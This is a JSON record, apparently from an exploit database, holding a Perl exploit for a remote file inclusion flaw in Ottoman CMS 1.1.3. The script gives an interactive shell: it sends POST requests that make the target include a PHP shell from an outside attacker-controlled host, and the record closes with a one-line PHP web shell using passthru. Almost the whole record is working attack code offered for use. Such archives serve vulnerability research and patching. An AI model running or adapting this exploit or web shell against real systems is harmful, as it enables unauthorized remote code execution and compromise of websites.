{
  "id": "1998",
  "title": "Ottoman CMS 1.1.3 - &#039;?default_path=&#039; Remote File Inclusion (2)",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\n\r\n################################################################################\r\n#                                                                              #\r\n#         Jacek Wlodarczyk (j4ck) - jacekwlo[at]gmail[dot]com                  #\r\n#                                                                              #\r\n################################################################################\r\n\r\n\r\n\r\n\r\n#Title:       Ottoman CMS <= 1.1.3 Remote File Inclusion Exploit\r\n#Application: Ottoman Content Management System\r\n#Version:     1.1.3 and prior\r\n#Url:         http://www.lowter.com/p/ottoman\r\n\r\n\r\n\r\n#Affected software description:\r\n\r\n#Input passed to the \"default_path\" parameter in \"index.php\", \"error.php\", \"classes/main_class.php\", \"format_css.php\", \"js.php\",\r\n#and \"rss.php\" is not properly sanitized before being used to include files.\r\n#Vulnerable scripts not properly sanitizing user-supplied input to the 'POST' and 'COOKIE' variables.\r\n#This can be exploited to execute arbitrary PHP code by including files from local or external resources.\r\n#Exploitation requires turn ON \"register_globals\"\r\n\r\n#PoC Exploit (POST method):\r\n\r\n\r\n\r\nif (@ARGV ne 4)\r\n  {\r\n    &usage;\r\n  }\r\n\r\n\r\nsub usage()\r\n{\r\n  print \"\\r\\n (c) Jacek Wlodarczyk (j4ck)\\r\\n\\r\\n\";\r\n  print \"- Exploit for Ottoman CMS <= 1.1.3\\r\\n\\r\\n\";\r\n  print \"- Usage: $0 <target> <script location> <shell location> <shell variable>\\r\\n\";\r\n  print \"- <target>             -> Victim's target eg: http://www.victim.com\\r\\n\";\r\n  print \"- <script location>    -> Path to script  eg: /ottoman/error.php\\r\\n\";\r\n  print \"- <cmd shell location> -> eg: http://www.site.com/sh_dir/\\r\\n\";\r\n  print \"- <cmd shell variable> -> eg: cmd\\r\\n\\r\\n\";\r\n  print \"- Eg: http://127.0.0.1 /ottoman_v1.1.3/index.php http://10.0.0.10/sh_dir/ cmd\\r\\n\\r\\n\";\r\n  exit();\r\n}\r\n\r\n\r\n\r\n\r\n$HOST     = $ARGV[0];\r\n$DIR      = $ARGV[1];\r\n$INC_FILE = $ARGV[2];\r\n$CMD      = $ARGV[3];\r\n$COMMAND  = '';\r\n\r\nprint \"\\r\\nATTACKING : \".$HOST.$DIR.\"\\r\\n\\r\\n\";\r\n$HOST =~ s/(http:\\/\\/)//;\r\n       \r\n\r\nwhile()\r\n  {\r\n\r\n    print \"[shell] \\$\";\r\n    chomp($COMMAND = <STDIN>);\r\n    if ($COMMAND eq \"q\")\r\n      {\r\n        exit;\r\n      }\r\n\r\n    if (!$COMMAND)\r\n      {\r\n        print \"\\nPlease Enter a Command\\n\\n\";\r\n        next;\r\n      }\r\n\r\n\r\n    $data=\"default_path=\".$INC_FILE.\"&\".$CMD.\"=\".$COMMAND;\r\n    $post = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$HOST\", PeerPort => \"80\") || die \"Error 404\\r\\n\\r\\n\";\r\n\r\n    print $post \"POST \".$DIR.\" HTTP/1.1\\r\\n\";\r\n    print $post \"Host: \".$HOST.\"\\r\\n\";\r\n    print $post \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\\r\\n\";\r\n    print $post \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n    print $post \"Accept-Language: en-us;q=0.7,en;q=0.3\\r\\n\";\r\n    print $post \"Accept-Encoding: gzip,deflate\\r\\n\";\r\n    print $post \"Connection: Keep-Alive\\r\\n\";\r\n    print $post \"Keep-Alive: 300\\r\\n\";\r\n    print $post \"Cache-Control: no-cache\\r\\n\";\r\n    print $post \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    print $post \"Content-Length: \".length($data).\"\\r\\n\";\r\n    print $post \"Connection: close\\r\\n\\r\\n\";\r\n    print $post $data.\"\\r\\n\";\r\n\r\n\r\n\r\n\r\n\r\n    while ($ans = <$post>)\r\n      {\r\n        if ($ans =~ /404/ )\r\n          {\r\n            printf \"\\n\\nFile \".$ARGV[1].\" no exists.\\r\\n\\r\\n\";\r\n            exit;\r\n          }\r\n        printf $ans;\r\n      }\r\n\r\n  }\r\nexit;\r\n\r\n\r\n#Shell example:\r\n\r\n#config.php\r\n#------cut---------------\r\n#<?\r\n#passthru($_POST['cmd']);\r\n#?>\r\n#------cut---------------\r\n\r\n# milw0rm.com [2006-07-09]",
  "url": "https://www.exploit-db.com/exploits/1998"
}